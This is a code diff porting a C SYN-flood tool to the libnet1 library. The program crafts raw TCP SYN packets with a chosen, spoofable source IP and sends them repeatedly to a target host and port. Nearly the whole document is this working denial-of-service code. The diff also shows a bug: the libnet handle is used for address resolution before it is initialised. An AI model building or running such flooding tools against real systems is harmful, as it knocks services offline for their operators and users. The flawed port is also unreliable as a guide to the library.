@@ -19,8 +19,8 @@
 */
 
 /*
-	Developed and tested with libnet version 1.0.2a.
-	Under Debian Linux install libnet0-dev.
+	Developed and tested with libnet1.
+	Under Debian Linux install libnet1-dev.
 */
 
 
@@ -29,9 +29,9 @@
 #include <string.h>
 #include <libnet.h>
 
-//#define DEBUG
+#define DEBUG
 //#define SRC_PORT_RND
-//#define EXIT_ON_FAIL
+#define EXIT_ON_FAIL
 #define TTL 255
 #define USLEEP 250
 #define ARGC_MIN 4
@@ -44,14 +44,17 @@ int main(int argc, char **argv){
 	
 	unsigned int connections = 0;
 	unsigned int connectionsc;
-	int i, sockfd, sockWriteBytes;
+	int i, sockWriteBytes;
 	char *buf = NULL;
+	char *errbuf = NULL;
 	char *srcIpStr = NULL;
 	char *dstIpStr = NULL;
-	u_long srcIp = 0;
-	u_long dstIp = 0;
-	u_short srcPort = 0;
-	u_short dstPort = 0;
+	u_int32_t srcIp = 0;
+	u_int32_t dstIp = 0;
+	u_int16_t srcPort = 0;
+	u_int16_t dstPort = 0;
+	libnet_t *net;
+	libnet_ptag_t ipv4 = 0, tcp = 0;
 	
 	printf("synflood " VERSION " (%s %s)\n", __DATE__, __TIME__);
 	puts("Copyright (c) 2010 TheFox@fox21.at\n");
@@ -64,20 +67,27 @@ int main(int argc, char **argv){
 	if(argc == 5)
 		connections = atoi(argv[4]);
 	
-	libnet_seed_prand();
-	buf = (char *)malloc(LIBNET_IP_H + LIBNET_TCP_H);
+	errbuf = (char *)malloc(LIBNET_ERRBUF_SIZE);
 	
-	srcIp = libnet_name_resolve(srcIpStr, 1);
-	if(!srcIp){
+	srcIp = libnet_name2addr4(net, srcIpStr, LIBNET_RESOLVE);
+	if(srcIp == -1){
 		fprintf(stderr, "ERROR: bad SRC ip address: %s\n", srcIpStr);
 		exit(1);
 	}
 	
-	dstIp = libnet_name_resolve(dstIpStr, 1);
-	if(!dstIp){
+	dstIp = libnet_name2addr4(net, dstIpStr, LIBNET_RESOLVE);
+	if(dstIp == -1){
 		fprintf(stderr, "ERROR: bad DST ip address: %s\n", dstIpStr);
 		exit(1);
 	}
+	
+	
+	net = libnet_init(LIBNET_RAW4, srcIpStr, errbuf);
+	if(!net){
+		fprintf(stderr, "ERROR: libnet_init: %s", libnet_geterror(net));
+		exit(1);
+	}
+	libnet_seed_prand(net);
 	
 	printf("SRC %s\n", srcIpStr);
 	printf("DST %s %d\n", dstIpStr, dstPort);
@@ -87,8 +97,6 @@ int main(int argc, char **argv){
 	// connectionsc < connections
 	for(connectionsc = 0; connectionsc < connections || !connections; connectionsc++){
 		
-		memset(buf, 0, LIBNET_IP_H + LIBNET_TCP_H);
-		
 #ifdef SRC_PORT_RND
 		srcPort = libnet_get_prand(LIBNET_PRu16);
 #else
@@ -97,71 +105,60 @@ int main(int argc, char **argv){
 			srcPort = 1;
 #endif
 		
-		printf("connection %6d SPT=%d\n", connectionsc, srcPort);
-		
-		if((sockfd = libnet_open_raw_sock(IPPROTO_RAW)) == -1){
-			//fprintf(stderr, "ERROR libnet_open_raw_sock\n");
-			perror("ERROR libnet_open_raw_sock");
-			exit(1);
-		}
-
 #ifdef DEBUG
-		puts("libnet_build_ipv4");
+		printf("send %6d SPT=%d\n", connectionsc, srcPort);
 #endif
-		libnet_build_ipv4(
-			LIBNET_IP_H, // length
-			0, // TOS
+		
+		tcp = libnet_build_tcp(
+			srcPort, // src port
+			dstPort, // dst port
+			libnet_get_prand(LIBNET_PRu16), // seq
+			0, // ack
+			TH_SYN, // control
+			65535, // window
+			0, // checksum
+			0, // urgent
+			LIBNET_TCP_H, // header len
+			NULL, // payload
+			0, // payload size
+			net,
+			tcp
+		);
+		if(tcp == -1)
+			fprintf(stderr, "ERROR: libnet_build_tcp: %s", libnet_geterror(net));
+		
+		ipv4 = libnet_build_ipv4(
+			LIBNET_IPV4_H, // len
+			0, // tos
 			libnet_get_prand(LIBNET_PRu16), // ip id
-			IP_DF, // flag offset
+			IP_DF, // frag
 			TTL, // ttl
 			IPPROTO_TCP, // upper layer protocol
-			srcIp,
-			dstIp,
+			0, // checksum
+			srcIp, // src ip
+			dstIp, // dst ip
 			NULL, // payload
-			0, // payload length
-			buf
+			0, // payload size
+			net,
+			ipv4
 		);
-
-#ifdef DEBUG
-		puts("libnet_build_tcp");
-#endif
-		libnet_build_tcp(
-			srcPort, // src port
-			dstPort, // dest port
-			libnet_get_prand(LIBNET_PRu16), // seq num
-			0, // ack num
-			TH_SYN, // Control bits
-			65535, // Advertised Window Size
-			0, // Urgent Pointer
-			NULL, // data
-			0, // data len
-			buf + LIBNET_IP_H
-		);
+		if(ipv4 == -1)
+			fprintf(stderr, "ERROR: libnet_build_ipv4: %s", libnet_geterror(net));
 		
-#ifdef DEBUG
-		puts("libnet_do_checksum");
-#endif
-		libnet_do_checksum(buf, IPPROTO_TCP, LIBNET_TCP_H);
-
-#ifdef DEBUG
-		puts("libnet_write_ip");
-#endif
-		sockWriteBytes = libnet_write_ip(sockfd, buf, LIBNET_IP_H + LIBNET_TCP_H);
-		if(sockWriteBytes < LIBNET_IP_H + LIBNET_TCP_H){
-			perror("ERROR libnet_write_ip");
+		sockWriteBytes = libnet_write(net);
+		if(sockWriteBytes == -1){
+			fprintf(stderr, "ERROR: libnet_write: %s", libnet_geterror(net));
 #ifdef EXIT_ON_FAIL
 			exit(1);
 #endif
 		}
 		
-#ifdef DEBUG
-		puts("libnet_close_raw_sock");
-#endif
-		libnet_close_raw_sock(sockfd);
-		
+		//libnet_destroy(net);
 		usleep(USLEEP);
 		
 	}
+	
+	free(errbuf);
 	
 	puts("\nexit 0");
 	return 0;
